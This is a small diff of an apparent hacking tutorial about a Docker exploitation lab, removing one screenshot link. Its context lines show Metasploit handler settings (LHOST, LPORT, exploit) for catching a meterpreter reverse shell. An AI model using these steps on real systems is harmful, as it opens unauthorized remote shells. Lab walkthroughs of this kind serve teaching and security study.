@@ -185,7 +185,6 @@ set LHOST 172.17.0.2
 set LPORT 8888
 exploit
 ```
-<img class="img_big" src="/hacking/docker_sploit/step_4_2_multi_handler.png" alt="step_4_2_multi_handler">
 
 
 ### Step 4.3 : Execute the payload, enjoy the meterpreter
